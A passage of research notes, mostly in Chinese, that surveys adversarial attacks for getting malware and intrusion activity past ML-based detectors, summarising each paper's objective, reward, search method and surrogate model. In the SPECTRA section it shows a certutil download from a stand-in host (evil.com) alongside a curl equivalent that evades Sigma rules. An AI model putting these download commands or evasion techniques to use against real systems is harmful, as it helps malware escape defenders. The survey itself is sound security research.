§1:"we address C#2 by employing a Monte Carlo tree search (MCTS)-based optimization";§3.2.2 Algorithm 1:"we follow the four standard steps (i.e., Selection, Expansion, Simulation, and Backpropagation)";lines 6–11:"v_selected ← Selection(v) / Expansion(v); reward ← Simulation(v_selected, f, S); BackPropagation(v_selected, reward); v_node ← ChildWithHighestReward(v)"。

### 搜索算法总结

MCTS:在 call-based redividing 变换树上以标准四步迭代,每轮选 highest reward 子节点扩展 T 序列。

### Fitness(原文)

Eq. (1-2):`argmax_T g(z) − g(z_adv)` (w/ prob)、`argmin_T f(z_adv)` (w/o prob);Algorithm 1 line 10:`reward ← Simulation(v_selected, f, S)`;line 15-16:`if Evaded(f, x_adv)==True then return T`。

### Fitness 总结

Search reward = 真实 detector 给出的 malicious probability 下降 g(z)−g(z_adv) 或二值 misclassification 信号。

### 替代模型(原文)

§2.2 Threat Model:"knowing the predicted label f(z) with or without its probability g(z) after inputting z"。§1 将 surrogate-based attacks 列入对比 baseline 而非自身做法:"existing state-of-the-art black-box adversarial attacks, including gradient estimations with surrogate models [3,31,54]"。

### 替代模型总结

**原文无 surrogate model**,MCTS 的 Simulation 阶段直接以目标 f 反馈作 reward。

---

## 9. BagAmmo (Tang et al. USENIX'23)

### 优化问题方程(原文)

**原文无显式数学优化方程。**

§3 文字描述 4 条 requirements(R1-R4):
- R1: 只能加边, 不能删边/节点
- R2: 加的边必须对 attack scenarios 有意义
- R3: 用 try-catch trap 包装新加 call
- R4: 不能依赖目标 feature granularity

GA selection (Algorithm 1 line 13): top-N by (T, L) sequentially。

### 优化问题总结

原文不写数学方程,直接用 GA 多种群协同演化。攻击意图:让 detector 把 malware 判为 benign,扰动量(加边数)越少越好,满足 R1-R4 4 条 requirements。

### 奖励函数(原文)

**Eq 2(threat degree):**
```
T = { 1 - F(x)    if target model used         # F = target classifier
    { 1 - S(x)    if substitute model used     # S = attacker-trained GCN substitute
```

**Algorithm 1 Apoem line 13:**
```
Select top N individuals according to T(x_r^{(i,j)}) and L(x_r^{(i,j)}) in turn
```
其中 L = 加边数(perturbation amount)。

### 奖励函数总结

两个分数,**不合成一个,串行排序**:
- **威胁度 T = 1 - F(x)**:F 把 x 判为恶意的概率越低,T 越大,扰动越有效。比如 F(x)=0.3,T=0.7;F(x)=0.05,T=0.95
- **扰动量 L = 加了几条边**:加得越少越好

GA selection:**先按 T 排(取 top N),再在 top N 里按 L 排**。第一道关攻击效果,第二道关扰动小。

substitute model 是 attacker 自己训的 GCN,用 GAN 框架 + 多种群协同进化(Apoem)生成扰动。属于"(a) Stage 1 → (b) Stage 2 串行"(selection 层面)。


### 搜索算法(原文)

§5.1:"Apoem uses one population to represent a possible feature granularity. The multiple populations, corresponding to multiple possible feature granularities, cooperatively evolve";Algorithm 1 lines 7-14:"for each P^i do … Select top N individuals according to T(x) and L(x) in turn; Immigration(); Crossover(); Mutation();"。

### 搜索算法总结

对抗式多种群协同进化 Apoem:每个种群对应一种 FCG 特征粒度 (family/package/class),通过 immigration + crossover + mutation 共同演化猜中真实粒度并生成扰动。

### Fitness(原文)

Eq. (2):`T = { 1 − F(x) if target; 1 − S(x) if substitute }`;§5.3:"Apoem employs the metric fitness … Its calculation takes into account two factors: threat degree T and perturbation amount L."

### Fitness 总结

双因子 fitness (T, L):威胁度 T = 1 − 目标/替代模型恶意概率;扰动量 L = 新增边数。Selection 按 T 然后 L 串行 top-N。

### 替代模型(原文)

§5.2:"The discriminator … is implemented with a GCN, acting as a substitute network [10] to simulate the target model";§5.4:"We use a GCN … to extract features from the substitute model";Algorithm 1 line 17:"Train substitute model with F(x_r^{(i,j)}) and x_r^{(i,j)}"。

### 替代模型总结

**有 surrogate:GCN 判别器**,以目标 F 对查询样本的二分类标签做 label 训练,GAN 框架内作为生成器的廉价 fitness 评估器降低真 query 数。

---

## 10. HRAT (Zhao et al. CCS'21)

### 优化问题方程(原文)

### 优化问题方程(原文)

**原文无 max E[Σ R_t] 形式的显式优化方程。** 用 Deep Q-learning(Algorithm 1)实现,reward 函数由 Eq 7-8 给。

**Substitute model 目标(Eq 5,原文):**
```
Obj_adv(G) = argmin_δ Σ_i ω_i · σ(||x_i - T(G)||_2)       (Eq 5)

ω_i = +1 if x_i is benign training sample
ω_i = -1 if x_i is malware training sample
```

**约束(§4.1):**
- R1 Framework API: 不可改
- R2 Lifecycle method: 不可改 (onCreate/onDestroy 等)
- R3 JVM special method: 不可改 (<init>/<clinit>)
- R4 Flowdroid auxiliary method: 不可改
- 每个修改用 APPMOD 工具确保 functional consistency

### 优化问题总结

原文用 Deep Q-learning,Q-network 学 action 选择,reward 由 Eq 7-8 给。substitute model 在 feature 空间引导扰动方向(让特征靠近 benign、远离 malware)。约束 4 类不可改 method + APPMOD 工具确保功能保持。属于"grey-box":target 黑盒查询 + substitute 白盒梯度。

### 奖励函数(原文)

**Eq 7(RL reward,条件式):**
```
R(s_t, a_t) = { +1                              if f(Ĝ) ≠ f(G)    (攻击成功)
              { -(ΔN_node + ΔN_edge)             if f(Ĝ) = f(G)    (失败, 惩罚扰动量)
```

**Eq 8(删节点 v_tar 特殊 reward):**
```
R(·)_{rn} = 1 + N^{v_tar}_{caller} · N^{v_tar}_{callee}
   "删一个节点会清掉它所有 caller-callee 连接, 性价比高, 加 bonus"

各 action 单步 reward (失败时):
   Add edge:        -1
   Insert node:     -2
   Rewiring:        -3
```

**Eq 5(substitute action-value 函数):**
```
Obj_adv(G) = argmin_δ Σ ω_i · σ(||x_i - T(G)||_2)
   ω_i = +1 if benign training sample
   ω_i = -1 if malware training sample
   "让 T(G) 在 substitute 特征空间靠近 benign 样本, 远离 malware"
```

Deep Q-learning(Algorithm 1)训 Q-network。

### 奖励函数总结

RL reward 简单粗暴:**攻击成功 → R = +1**;**失败 → R = -(改了多少节点 + 多少条边)**(扰动越大罚越多)。

特殊:删节点 v_tar"性价比高"(一删清掉它所有 caller-callee 关系),额外加 `1 + caller数 × callee数` bonus。

Deep Q-learning 学每一步选哪个 action(加边/重连/插节点/删节点),目标最大化累计 reward。target classifier 只给 binary 成功/失败判定,**梯度走在 attacker 自己的 substitute 上**。属于"加权融合"模式(类 6)— success +1 跟扰动 penalty 隐式相加。


### 搜索算法(原文)

§3.3:"we leverage reinforcement learning … to learn how to take actions";Algorithm 1 ("Deep Q-learning for structural attack"):"Initialize action-value network Q with random weights θ … if tmp ≤ ε then a_i = argmax_a Q(G_i, a; θ) else a_i = random_action … Perform gradient descent: ∇_θ (y_j − Q(G_i+1, a_i; θ))²"。

### 搜索算法总结

Deep Q-learning:Q 网络选 action type (add/rewire/insert/delete),具体节点/边由 surrogate gradient search 选最大梯度的对象。

### Fitness(原文)

Eq. (7):`R(s_t, a_t) = { 1 if f(Ĝ) ≠ f(G); −(ΔN_node + ΔN_edge) if f(Ĝ) = f(G) }`;Eq. (5):`Obj_adv(G) = arg min_δ Σ ω_i · σ(‖x_i − T(G)‖_2)`。

### Fitness 总结

双层 fitness:RL 层用稀疏 reward(成功 +1,否则 −ΔN);节点/边层用 surrogate gradient ‖x_i − T(G)‖_2 选最大梯度对象。

### 替代模型(原文)

§3.3.2:"If the target system uses kNN, which is non-differentiable, as its classifier, we first transform kNN into a differentiable version";Eq. (5) 把 surrogate loss 写在 m 个 training-set 实例上。

### 替代模型总结

**有 differentiable surrogate**:对不可微分类器(kNN)构造可微近似,在 Obj_adv 上反传梯度引导每步 action object 选择。

---

## 11. EvadeDroid (Bostani et al. CnS'24)

### 优化问题方程(原文)

**Eq 1(§4.2):**
```
minimize    |δ|
over        δ ⊆ Δ

subject to:
   f(φ(T_δ(z))) ≠ f(φ(z))                  (攻击成功)
   q ≤ Q                                    (query 预算)
   c(T_δ(z), z) ≤ α                          (payload size 增长限制)

c(T_δ(z), z) = ([T_δ(z)] - [z]) / [z] × 100  (Eq 2)
Δ = action set, 从 donor benign APK 抽的 transformations
```

**等价 RS 优化(Eq 3,实际算法用):**
```
argmax      g_{y=0}(φ(T_δ(z)))               (benign class confidence)
over        δ ⊆ Δ

subject to:
   q ≤ Q
   c(T_δ(z), z) ≤ α
```

### 优化问题总结

正式 constrained optimization。Eq 1 形式:**最小化扰动 transformation 数 |δ|**,subject to 攻击成功 + query 预算 Q + payload size α 上限。等价 Eq 3:**最大化 benign 类置信度**(因为最小化扰动跟最大化 benign 置信度方向一致)。

**两阶段算法**:Preparation 阶段用 n-gram 相似度筛 donor benign APK(Eq 4-5)→ 决定 transformation 集 Δ;Manipulation 阶段 Random Search 在 Δ 上找 δ。

### 奖励函数(原文)

**Eq 1(原问题):**
```
minimize    |δ|
over        δ ⊆ Δ

subject to:
   f(φ(T_δ(z))) ≠ f(φ(z))                  (攻击成功)
   q ≤ Q                                    (query 预算)
   c(T_δ(z), z) ≤ α                          (payload size)
```

**Eq 3(RS 实际优化):**
```
argmax     g_{y=0}(φ(T_δ(z)))                (benign class confidence)
over       δ ⊆ Δ
s.t.       q ≤ Q, c ≤ α
```

**Eq 2(size cost):** `c(T_δ(z), z) = ([T_δ(z)] - [z]) / [z] × 100`

**Preparation 阶段 — Donor selection(Eq 4-5):**
```
Eq 4 (n-gram containment 相似度):
   σ(m_i, b_j) = |v(m_i) ∩ v(b_j)| / |v(b_j)|
   "benign APK b_j 的 n-gram 特征有多少出现在 malware m_i 里"

Eq 5 (donor weight):
   w_{b_j} = Σ_{m_i ∈ M} σ(m_i, b_j) / |M|
   "b_j 跟整批 malware 的平均相似度"
   按 w 降序排, 取 top-k benign APK 作 donor → 抽 gadget 组成 Δ
```

Random Search:每步随机从 Δ 选 transformation λ,只在 confidence 提升时接受。

### 奖励函数总结

**两阶段:**

**Preparation 阶段** — 用 n-gram 相似度筛 donor benign APK:① Eq 4 算两两相似度 σ(m_i, b_j) ② Eq 5 算每个 b_j 跟整批 malware 的平均相似度 w ③ 按 w 排,取 top-k 作 donor ④ 从 donor 抽 API call 相关 gadget,union 作 transformation 集 Δ。这步是 **(b) 候选预筛**,Δ 本身就带"良性"基因 + "像 malware"。

**Manipulation 阶段** — Random Search:每轮随机抽 λ ∈ Δ,算 g_{y=0}(目标给"良性类"的概率),提升才接受。直到 target 翻车或 query 耗尽。

**硬约束**(都是 attacker budget):q ≤ Q + c ≤ α。**混合类**:(b) 信号在 Preparation 阶段做候选预筛(类 2 思路),fitness 是 (a) g_{y=0} 单目标,硬约束是 attacker budget(类 1 风格)。


### 搜索算法(原文)

§4.3.2:"We employ Random Search (RS) as a simple black-box optimization method to solve equation (3) … EvadeDroid utilizes RS to find an optimal subset of transformations δ";Algorithm 1:"while q ≤ Q and z* is classified as a malware do λ ← Select a transformation randomly from Δ\δ; z' ← T_λ(z*); l ← L(φ(z')); if c(z, z') ≤ α then if L_best ≤ l then L_best ← l; z* ← z'; δ ← δ ∪ λ"。

### 搜索算法总结

Random Search:每轮从 gadget action set Δ 随机抽一个 transformation,若 fitness 提升且满足 payload 大小约束 c ≤ α 则接受,直到检测翻转或预算耗尽。

### Fitness(原文)

Soft-label Eq. (3):`argmax_{δ⊆Δ} g_{y=0}(φ(T_δ(z))) s.t. q ≤ Q, c(T_δ(z), z) ≤ α`;hard-label Eq. (6-7):`s(a) = max_{b∈B} |v(a) ∩ v(b)| / ‖h_a − h_b‖_1`。

### Fitness 总结

Soft-label 时 fitness = 目标 benign-class 置信度 g_{y=0};hard-label 时改用 n-gram opcode containment / l1-norm 相似度作无参代理。

### 替代模型(原文)

§4.1:"EvadeDroid does not have knowledge of the training data D, the feature set X, or the classification model f … The attacker can only obtain the classification results (e.g., hard labels or soft labels) by querying the target malware classifier."

### 替代模型总结

**原文无 trainable surrogate model**;hard-label 模式下用 benign n-gram 相似度做无参代理,但非可训练 substitute。

---

## 12. AdvDroidZero (He et al. CCS'23)

### 优化问题方程(原文)

**原文无显式数学优化方程。** §3.3 文字描述 3 条 manipulation requirements:
- Functional consistency: 不破坏 APK 原功能
- Robustness to pre-processing: 不被静态分析的 dead code 检测消除
- All-feature influence: 扰动同时影响 manifest + DEX 特征

实际算法用扰动选择树 + semantic-based adjustment policy(Algorithm 1)自适应学习,隐式追求 malicious confidence 最小化。query 预算 Q ∈ {10, 20, 30, 40}。

### 优化问题总结

原文不写数学方程。算法用扰动选择树根据 query 反馈自适应调节点概率,追求 target malicious confidence 下降,直至 f(z*) = benign 或 query 耗尽。

### 奖励函数(原文)

**Adjustment Policy(Algorithm 1):**
```
Input: 扰动树 T, 选中节点 P, 前 malicious conf y, 新 malicious conf y'

if y' ≥ y:                    # 扰动没用 / 反效果
   爬回 P 的父节点
   重新初始化子树概率, 加 penalty
elif y' < y:                  # 扰动有效
   保持选中节点概率

调整内部节点 + 第 1 层概率 (line 22-23)
按节点深度乘 0.1 penalty
```

**优化目标(隐式):** 最小化 target 给的 malicious confidence g(z)。

### 奖励函数总结

维护一棵"扰动选择树",树里每个节点对应一种扰动选项,每个节点有概率。每次 query 后看 target 给的恶意置信度变化:

- **降了**(y' < y,扰动有效) → 保留这个节点的概率
- **没变 / 升了**(y' ≥ y,扰动没用 / 反效果) → 把这个节点的概率重新分配给同级 sibling,加 penalty;父节点也加 penalty(深度越深 penalty 越大)

逐步学到"哪些扰动节点路径有效",像 RL 的 policy gradient。**没有显式 reward 函数**,通过概率自适应来隐式追求"恶意 confidence 最小化"。属于"启发式 pipeline / 无显式 fitness"模式(类 7)。


### 搜索算法(原文)

§3.2:"AdvDroidZero builds the perturbation selection tree … The tree's leaf nodes represent specific malware perturbations, while internal nodes symbolize shared semantics … selects malware perturbations iteratively using the perturbation selection tree, injects … queries the target model, and updates the perturbation selection tree based on the received feedback through a semantic-based adjustment policy";Algorithm 1:"if y' ≥ y then … Adjust the internal node probability … RefInitProb(P'); if y' = y then AddPenalty(P, P')"。

### 搜索算法总结

概率自适应树(hierarchical Bandit-style):按节点概率从根采样到叶节点扰动,根据 query 反馈 Δy = y' − y 调整祖先节点概率。

### Fitness(原文)

Algorithm 1 Input:"Previous malicious confidence y; Malicious confidence y'";§3.5:"If perturbations positively impact malware evasion (decreasing the model's confidence in the malware label), the probability of semantically related perturbations should be increased."

### Fitness 总结

Fitness = 目标模型恶意置信度 y;以 Δy = y' − y 正负作为 bandit reward 信号自顶向下传到子树概率。

### 替代模型(原文)

§3.2:"victim model querying";§3.3:"AdvDroidZero lacks knowledge of the feature spaces, model parameters, and training dataset of the target model."

### 替代模型总结

**原文无 surrogate model**,所有学习体现在 perturbation selection tree 概率上,直接查 victim。

---

## 13. ProvNinja (Mukherjee et al. USENIX'23)

### 优化问题方程(原文)

**原文无显式数学优化方程。** §3.1 只用文字描述:"find a function that provides graph transformations that minimize the anomaly detection probability. The function takes as input the established model, the desired attack vector, and system event frequency data, then outputs a modified attack vector that minimizes the anomaly score of the attack."

**实际算法(Algorithm 1):**
- 对每条 rare edge,找 gadget chain 使 regularity 升高 + M(G') = benign
- 用 frequency database F 找替代 program
- 通过 modification distance D 和 regularity threshold T 控制扰动

### 优化问题总结

原文不写数学方程,只文字描述目标:找 graph transformation 使 anomaly detection probability 最小化。算法直接 greedy 替换 rare edge 成更常见的 gadget 链,defense model M 输出 benign 即停。

### 奖励函数(原文)

**Regularity score(§4.3,事件级度量,用于排序候选,非 fitness):**
```
R_e(u, v, r) = |Freq(u, v, r)| / |Freq(u, *, r)|
             = "u 创建的所有事件中, r 类型到 v 的占比"
```

**Algorithm 1(无显式 reward,binary 终止):**
```
rare_edges = TOPRAREEDGES(E, K)                    # 选 K 个低 regularity 边
for each rare edge e:
  gadgets = FINDGADGETCHAINS(e, F, T)              # 找替代 gadget 链 (T=0.03 阈值)
  G' = APPLYGADGET(G, g)
  if M(G') == benign: return G'                    # binary 终止
  else: 递归 (D-1)
```

**反 GNN 检测:** 加 benign 子结构 mimicking benign program 的 frequency 分布(§4.7)。

### 奖励函数总结

**完全没 fitness 函数,纯启发式 gadget 替换。**

直观:攻击图里有些边是"罕见的"(比如 `excel.exe → java.exe`,在历史 log 里很少出现),这种边容易被 detector 抓。ProvNinja 做的是:① 找出攻击路径里所有"罕见边"(regularity 低) ② 对每条罕见边,在 frequency database 里查"能达到同样攻击效果,但用更常见 program 实现"的 gadget 链。例:`excel → java` 改成 `excel → splwow64`(更常见) ③ 替换 + 用 defense model M 测一下,变 benign 就成。

regularity 分数是事件级度量,**不是 fitness**,只用来排序候选。属于"启发式 pipeline / 无显式 fitness"模式(类 7)。


### 搜索算法(原文)

Algorithm 1 (§4.6):"rare_edges = TOPRAREEDGES(E, K); gadgets = ⋃ FINDGADGETCHAINS(e, F, T); foreach g ∈ gadgets do G' = APPLYGADGET(G, g); if M(G') == benign then return G'; G' = PROVNINJA(G', F, M, D−1, T, K); if G' ≠ ∅ then return G'."

### 搜索算法总结

贪婪 + 有限深度递归 gadget 替换:每轮挑最稀有 top-K 边,枚举候选 gadget 链,apply 后若模型判 benign 即返回,否则递归(深度上限 D)。无回溯优化。

### Fitness(原文)

§4.3:"R_e(u, v, r) = |Freq(u,v,r)| / |Freq(u,*,r)|";§4.6:"We only include system events that have greater regularity than a user-defined threshold T (in our experiments in §6, we use a constant T = 0.03)"。

### Fitness 总结

内层用 regularity score R_e ≥ T (=0.03) 过滤候选 gadget;外层用 M(G')==benign 二值终止判据,无连续梯度信号。

### 替代模型(原文)

§3.2:"The adversary has access to publicly available program execution frequency statistics, which we call the surrogate frequency database. We infer the rarity of events directly from the regularity scores calculated using the surrogate frequency database."

### 替代模型总结

**有 surrogate,但不是神经网络** — 是公开 program execution **frequency database**(n-gram-style 单跳事件频率),用 regularity score 近似黑盒模型对 rarity 的判断,避免大量真 query。

---

## 14. Goyal et al. (NDSS'23)

### 优化问题方程(原文)

**原文无显式 find/max/min formal optimization 方程。** §IV Threat Model 只描述 T 的形式跟限制:

**原文 §IV 表述:**
```
Ẽ^A = E^A + Θ                                  (T 的形式: 只能加边)
其中 Θ 不能引入孤立边 (disconnected edges)
Ṽ^A = V^A ∪ "Θ 引入的新顶点"
约束: Ṽ^A ⊆ V                                  (T 只作用在 attacker subgraph G^A)
T 必须排他作用在 G^A 上 (不能动 V \ V^A 的部分)
```

**算法(Algorithm 1 idealized loop):**
```
while  Dist(V_N, V_E) ≥ threshold:
       add benign substructures into G^E
       re-encode embedding V_E
       
最终: V_E 靠近 benign cluster N_β^γ(G^N)
```

### 优化问题总结

§IV 给 Threat Model:**find evasion graph G^E = T(G^A) s.t. f(G^E) ≠ f(G^A)=1**(evade Prov-HIDS)。变换 T 受限:只能加边/节点(E^A ⊆ E^E,V^A ⊆ V^E),且 T 只作用在 attacker subgraph G^A。实际算法用"距离 < threshold"作终止条件 — 没有显式 reward,纯距离驱动迭代。

### 奖励函数(原文)

**Algorithm 1(idealized loop,无显式 fitness,binary 距离阈值终止):**
```
G^E = G^A                                        # init evasion = attack graph
while Dist ≥ threshold:
  P_N = PICKSUBSTRUCTS(G^E, Z_N, V_N)            # 选 benign 子结构
  G^E = ADDSUBSTRUCTS(G^E, P_N)                  # 加进 evasion graph
  V_E = E_χ(N_β^γ(G^E))                          # 重编码 embedding
  Dist = F^δ(V_N, V_E)                           # 算 distance to benign
return G^E
```

**Dist metric 因 Prov-HIDS 而异:**
- StreamSpot:cosine distance(到 nearest benign cluster)
- Unicorn:normalized Jaccard distance
- ProvDetector:Euclidean distance(到 benign cluster center)

### 奖励函数总结

**没 fitness,纯"距离驱动"。**

直觉:Prov-HIDS 把每个图编码成一个 embedding 向量,benign 图聚成一个 cluster。attacker 想把攻击图的 embedding 推进这个 benign cluster:① 抓一堆 benign 子结构(从 benign 图里抽的小 subgraph) ② 把这些子结构往攻击图上塞,塞一次重新 encode 算"现在攻击图 embedding 跟 benign cluster 的距离" ③ 距离够近(< threshold)就停。

距离怎么算因 detector 而异(StreamSpot cosine / Unicorn Jaccard / ProvDetector Euclidean)。属于"启发式 pipeline / 无显式 fitness"模式(类 7)。


### 搜索算法(原文)

Algorithm 1 (§V-B):"G^E = G^A; Z_N = N^γ_β(G^N); V_N = E^κ_λ(Z_N); V_E = E^κ_λ(N^γ_β(G^E)); Dist = F^δ(V_N, V_E); while Dist ≥ threshold do P_N ← PICKSUBSTRUCTS(G^E, Z_N, V_N); G^E ← ADDSUBSTRUCTS(G^E, P_N); V_E ← E^κ_λ(N^γ_β(G^E)); Dist ← F^δ(V_N, V_E); end; return G^E"。

### 搜索算法总结

Embedding-distance 驱动的爬山搜索:不断从良性图中选子结构 ADD 到攻击图,直到 attack/benign embedding 距离 Dist < threshold。无 GA / RL / 回溯。

### Fitness(原文)

Eq. (2):"f(G_i) = 1(F^δ(E^κ_λ(N^γ_β(G_i))) ≥ α). … F^δ(V_i) is a distance function that compares V_i against a set of learned graph encodings"。

### Fitness 总结

Fitness = 攻击图 embedding 到良性 embedding 簇的距离 F^δ(V_N, V_E)(cosine / Jaccard / Euclidean,依目标系统);距离 < α 即检测器判 benign。

### 替代模型(原文)

§IV:"the attacker has access to procedures that enable them to access or infer the contents of audit logs";§V-A:"the attacker starts by profiling the target system to identify a large number of graph substructures associated with benign activity"。

### 替代模型总结

**原文无 surrogate detector model**,攻击者直接 profile 目标主机 audit log 的 benign substructure 分布反推驱动 ADDSUBSTRUCTS。

---

## 15. Contorter (Nasr et al. S&P'26)

### 优化问题方程(原文)

**原文无显式整体 formal optimization 方程。** §3.3 给 4 个 module 各自的 score 函数(见下面"奖励函数(原文)"),没合成统一的 max/min 问题。

### 优化问题总结

原文不写统一 formal optimization,直接 4-module pipeline 串联过滤候选:TypeSel(type 匹配)→ FOpt(边数合理)→ CSMax(embedding 相似)→ ImpMax(target benign 置信度)。对每个 malicious 节点 v_m 找 1 个 best v_c,复制 v_c 的 1-hop 邻居边到 v_m。属于白盒为主(用 model embedding 跟 confidence),Table 3 有黑盒版(只 TypeSel + FOpt)。

### 奖励函数(原文)

**Eq 1(候选节点 v_c 的 edge 集):**
```
E_c = {(v_c, v_i, r) ∈ E | v_i ∈ N(v_c)} ∪ {(v_i, v_c, r) ∈ E | v_i ∈ N(v_c)}
```

**Eq 2(gadget 边集 — 复制到 malicious 节点 v_m):**
```
E_m = {(v_m, v_i, r) | (v_c, v_i, r) ∈ E_c} ∪ {(v_i, v_m, r) | (v_i, v_c, r) ∈ E_c}
```

**CSMax similarity:**
- Flash / NodLink / Threatrace(directional emb): `cos(e_m, e_c) = (e_m · e_c) / (|e_m| · |e_c|)`
- Magic(distance-based): `(1/k) Σ ||e_m - e_b||_2`

**ImpMax confidence:**
- Flash: `(# correct predictions) / (Total # of models)`
- Magic: 距 benign cluster 距离反比
- NodLink: reconstruction error
- Threatrace: top-2 type 概率比

### 奖励函数总结

**4 个 module 串联过滤,把"候选 benign 节点"逐步缩小到最优 1 个。**

要把 malicious 节点 `update.exe` 伪装成 benign 节点(比如 `wscript.exe`)的样子:① **TypeSel** 候选必须是同 type(process / file) ② **FOpt** 候选节点的边数得在合理范围(太少没影响,太多会过度暴露) ③ **CSMax** 用 PIDS 自己的 embedding 算 cosine 相似度,挑跟 `update.exe` embedding 最像的候选 ④ **ImpMax** 让 target classifier 给"benign"分数最高的候选优先。

挑完之后,把候选的边(`wscript.exe → kernel32.dll` 等)**复制到 malicious 节点周围**,让 update.exe 的邻域结构跟 wscript.exe 一样,骗过 PIDS。**没单一 fitness**,4 个 module 各自的 score 顺次过滤。属于"启发式 pipeline / 无显式 fitness"模式(类 7)。


### 搜索算法(原文)

Algorithm 1:"foreach malicious node v_m ∈ VM do Cands ← TYPESEL(v_m.type, v_b.type); Cands ← FOOTPRINTOPT(v_b, R); Cands ← CSMAX(Emb(v_m), Emb(v_b), T_s); v_c ← Cands[0]; e' ← GADRET(v_c); if OCCVER(e', G) then E' ← E' ∪ {e'}; while EVer(v_m) is false do Cands ← IMPMAX(Cands, D); v_c ← Cands[i]; …"。

### 搜索算法总结

4-module pipeline + ImpMax 失败重试:对每个恶意节点过 TypeSel → FOpt → CSMax → GadRet → OccVer → EVer,EVer flagged 时走 ImpMax 按 classification confidence 排序的备选名单逐个重试。无 MCTS / GA。

### Fitness(原文)

§3.2.3 (CSMax):"cosine similarity between the malicious node's embedding (e_m) and each candidate's embedding (e_b), as (e_m · e_b) / (||e_m|| ||e_b||)";Magic 用 "Euclidean distance … (1/k) Σ ||e_m − e_b||_2"。§3.4 (ImpMax):"classification confidence as # of correct predictions / Total # of models"。

### Fitness 总结

两层 fitness:CSMax 用 embedding 空间 cosine / Euclidean 相似度排候选;失败后 ImpMax 改用 PIDS classification confidence 把"会被强分类为 benign"的候选优先。

### 替代模型(原文)

§2.3 Threat Model:"In our black-box model, attackers … cannot access the node embeddings, and cannot access detection confidence. … we assume that black-box attackers cannot query the PIDS to verify and refine the evasion." 白盒变体:"the attacker may train a surrogate model of the PIDS on a local host using public datasets or activity logs of the target host"。

### 替代模型总结

**白盒下有 surrogate(本地 PIDS 替代),黑盒下原文无 surrogate** — 因 CSMax/ImpMax 需要 embedding 与 confidence,Contorter 严格上是 white-box-leaning。

---

## 16. SPECTRA (Shoaib et al. — local PDF, SIEM Sigma 命令行 evasion)

### 优化问题方程(原文)

**原文无显式 find/max/min 统一 formal optimization 方程。** §2-3 各自定义概念。

**原文 §2 显式表述(evasion 条件):**
```
"an evasive command ĉ preserves the seed's effects while making the paired rule evaluate false,
that is, Φ_R(E(ĉ)) = FALSE.  
Unless stated otherwise, evasion is per rule;  
a global evasion E' is an attacker sequence satisfying Φ_R(E') = FALSE for all rules R."

→ 局部 evasion:  Φ_R(E(ĉ)) = FALSE   (paired rule r)
→ 全局 evasion:  ∀ rules R, Φ_R(E') = FALSE
```

**原文 §3.4.1 定义 α, β:**
```
α(G_i, B_u) ∈ [0, 1]  (effect alignment, maximum bipartite matching)
β(G_i, B_u) ∈ [0, 1]  (binding coverage)

→ 用于 candidate pairing 排序, 非整体 formal optimization
```

E(c) = command 真跑后的 audit log,Φ_R 评估 boolean rule。

### 优化问题总结

正式问题:**find ĉ s.t. Φ_R(E(ĉ)) = FALSE(对 paired rule r,局部 evasion;或对所有 rules,全局 evasion)+ E(ĉ) preserves seed effects(语义保持)+ E(ĉ) 不含 avoid set A_i 的 literals**。候选选择阶段最大化 α(effect alignment)+ β(binding coverage)。

实质是"在 reference utility 库里找等价命令"的搜索问题:**Φ_R = FALSE 是攻击成功条件,effect preservation 跟 avoid set 是硬约束**。

### 奖励函数(原文)

**Avoid set:** `A_i = A(y_i)` — rule literals 不可再出现

**Composite effect key(MAKEKEY):**
```
K(G, E, π, B) = ⟨k(E), κ(E), h_pos(π), h_chain(B)⟩
  k(E) = sorted primitive list
  κ(E) = primitive multiplicities (capped at 2)
  h_pos = positional signature hash
  h_chain = binding chain hash
```

**Effect alignment score(§3.4.1):**
```
α(G_i, B_u) ∈ [0, 1]
= fraction of seed edges covered by maximum bipartite matching
  between seed edges and candidate edges
```

**Binding coverage(§3.4.1):**
```
β(G_i, B_u) ∈ [0, 1]
= fraction of seed binding chains that admit type-compatible
  realizations in B_u under the matching
```

**Evasion 判定:**
```
全局 evasion:  Φ_R(E') = FALSE for all rules R
局部 evasion (论文 default):  Φ_R(E(ĉ)) = FALSE 对 paired rule r
```

### 奖励函数总结

**想法:同一个"攻击效果"可以用不同的命令组合实现 — 找一个能绕开 Sigma 规则的等价命令。**

例:原命令 `certutil -urlcache -split -f http://evil.com/p.exe C:\p.exe` 被 Sigma 规则抓。SPECTRA 找等价:用 `curl -L -s http://evil.com/p.exe -o C:\p.exe`(curl 也能 download,但不含 `certutil` literal,规则不抓)。

5 步流程:① 抽 effect graph(原命令做了什么) ② avoid set(原 Sigma 规则查哪些 literal 不能再出现) ③ 在 reference utility 库(LOLBAS / SS64 / Microsoft)查可替代 utility ④ α + β 排序(α effect 对齐 + β 参数兼容) ⑤ 测 rule(候选填具体命令,跑,看 Sigma 规则 evaluate FALSE 即成功)。

**没单一 fitness**,α / β 兼容度 + avoid set 硬约束联合用。属于"启发式 pipeline / 无显式 fitness"模式(类 7)。跟 SafeMimic-CMD 最接近(命令行 evasion),但 SPECTRA 针对**静态 SIEM 规则**(可解析的 boolean),我们针对 **ML PIDS**(continuous score)。


### 搜索算法(原文)

§3.4 EVASIONSYN:"for t = 1 to kd do a ← FILLARGS(B_u*, π_s); ĉ ← ASMCMD(u*, G_s, π_s); e ← SANITY(ĉ, u*, G_s, B_u*); if check = OK then return ĉ";§3.3.1:"We require exact matches on all key components: primitive inventory, multiplicity, positional hash, and binding hash must agree."

### 搜索算法总结

检索 + lexicographic 排序的非迭代生成流水线(非 search loop):Rule Extractor → Reference Processor → Effect Matching (LOOKUPIDX exact key) → EvasionSynth (FILLARGS / ASMCMD ≤ kd 次 retry)。无 GA / MCTS。

### Fitness(原文)

§3.4:"effect graph alignment score, α(G_i, B_u) ∈ [0, 1] … fraction of seed edges covered by the resulting maximum matching";"binding coverage β(G_i, B_u) ∈ [0, 1]";§3.4.3:"J(u) = (α, β, δ_key, δ_pos, δ_flags, Δπ_t, q_u) [lexicographic]"。

### Fitness 总结

Fitness = lexicographic 向量 J(u) = (α, β, δ_key, δ_pos, δ_flags, Δπ, q_u),按 effect-graph alignment α 主排序,binding coverage β 次排序,以此类推。多目标词典序最大化。

### 替代模型(原文)

§3.1.1:"We do not execute commands that SPECTRA generates. Instead, for each function u = (bin, fn) we supervise from two textual views";§3.1:"Rule Effect Extractor uses a BiLSTM-CRF tagger";Sigma rule φ_R 直接 literal 验证。

### 替代模型总结

**原文无 detector surrogate**(不训 Sigma 规则替代分类器,也不 query SIEM);内部有 BiLSTM-CRF + text encoder 作 rule effect 抽取,**非替代检测器**;evasion 由 φ_R(E(ĉ)) = FALSE 直接形式验证。

---

## 17. HQA-Attack (Liu et al. NeurIPS'23)

### 优化问题方程(原文)

**§3:**
```
adversarial condition (Eq 1):
